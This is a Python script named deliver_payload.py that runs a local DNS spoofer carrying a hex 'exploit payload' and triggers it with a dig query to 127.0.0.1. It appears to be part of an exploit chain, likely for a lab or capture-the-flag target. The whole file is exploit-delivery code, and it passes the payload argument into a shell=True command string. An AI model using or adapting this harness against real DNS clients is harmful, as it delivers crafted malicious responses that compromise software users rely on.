# deliver_payload.py
import subprocess
import time
import argparse

def main(payload_hex: str):
    """
    Starts the DNS spoofer, triggers it with dig, and then terminates.
    This ensures the entire exploit delivery happens in one atomic step.
    """
    print("[DELIVER] Starting DNS spoofer in the background...")
    spoofer_command = f"python3 dns_spoofer.py --payload {payload_hex}"
    spoofer_process = subprocess.Popen(spoofer_command, shell=True, text=True)
    
    # Give the spoofer a moment to bind to the port
    time.sleep(2)
    
    print("[DELIVER] Triggering spoofer with 'dig'...")
    subprocess.run("dig @127.0.0.1 dos.com", shell=True, capture_output=True)
    
    # Wait for the spoofer to finish (it exits after one query)
    try:
        spoofer_process.wait(timeout=5)
        print("[DELIVER] Spoofer process finished.")
    except subprocess.TimeoutExpired:
        print("[DELIVER] Spoofer timed out, killing.")
        spoofer_process.kill()

    print("[DELIVER] Payload delivery sequence complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Payload Delivery Script")
    parser.add_argument("--payload", type=str, required=True, help="The exploit payload in hex format.")
    args = parser.parse_args()
    main(args.payload)